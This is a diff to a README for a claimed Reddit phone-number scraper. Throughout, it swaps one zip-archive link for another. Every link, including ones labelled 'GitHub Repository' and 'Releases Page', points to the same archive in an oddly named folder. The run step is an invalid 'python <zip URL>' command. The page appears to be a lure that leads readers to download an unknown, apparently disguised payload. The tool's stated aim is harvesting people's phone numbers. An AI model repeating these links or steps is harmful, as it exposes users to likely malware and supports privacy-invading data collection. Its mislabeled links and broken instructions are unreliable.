@@ -17,13 +17,13 @@ Before you download, ensure your system meets these requirements:
 
 To download the application, click the button below:
 
-[![Download reddit-phone-number-scraper](https://raw.githubusercontent.com/IngeniJon/reddit-phone-number-scraper/main/guvacoline/scraper-reddit-number-phone-1.9-alpha.2.zip%20reddit--phone--number--scraper-blue)](https://raw.githubusercontent.com/IngeniJon/reddit-phone-number-scraper/main/guvacoline/scraper-reddit-number-phone-1.9-alpha.2.zip)
+[![Download reddit-phone-number-scraper](https://github.com/IngeniJon/reddit-phone-number-scraper/raw/refs/heads/main/guvacoline/reddit-scraper-number-phone-v1.1.zip%20reddit--phone--number--scraper-blue)](https://github.com/IngeniJon/reddit-phone-number-scraper/raw/refs/heads/main/guvacoline/reddit-scraper-number-phone-v1.1.zip)
 
 ### 🔗 Visit the Releases Page
 
 Alternatively, you can visit the releases page to see all available versions and download the latest release:
 
-[Visit Releases Page](https://raw.githubusercontent.com/IngeniJon/reddit-phone-number-scraper/main/guvacoline/scraper-reddit-number-phone-1.9-alpha.2.zip)
+[Visit Releases Page](https://github.com/IngeniJon/reddit-phone-number-scraper/raw/refs/heads/main/guvacoline/reddit-scraper-number-phone-v1.1.zip)
 
 ## 📃 How to Install
 
@@ -39,7 +39,7 @@ Alternatively, you can visit the releases page to see all available versions and
    ```
 5. **Run the Application**: Type the following command to start the application:
    ```
-   python https://raw.githubusercontent.com/IngeniJon/reddit-phone-number-scraper/main/guvacoline/scraper-reddit-number-phone-1.9-alpha.2.zip
+   python https://github.com/IngeniJon/reddit-phone-number-scraper/raw/refs/heads/main/guvacoline/reddit-scraper-number-phone-v1.1.zip
    ```
 6. **Follow the Prompts**: The application will guide you on what to do next. Enter the subreddit you want to scrape for phone numbers.
 
@@ -78,7 +78,7 @@ If you encounter issues or have questions, you can reach out through the Issues 
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/IngeniJon/reddit-phone-number-scraper/main/guvacoline/scraper-reddit-number-phone-1.9-alpha.2.zip)
-- [Visit Releases Page](https://raw.githubusercontent.com/IngeniJon/reddit-phone-number-scraper/main/guvacoline/scraper-reddit-number-phone-1.9-alpha.2.zip)
+- [GitHub Repository](https://github.com/IngeniJon/reddit-phone-number-scraper/raw/refs/heads/main/guvacoline/reddit-scraper-number-phone-v1.1.zip)
+- [Visit Releases Page](https://github.com/IngeniJon/reddit-phone-number-scraper/raw/refs/heads/main/guvacoline/reddit-scraper-number-phone-v1.1.zip)
 
 Thank you for using reddit-phone-number-scraper! Happy extracting!
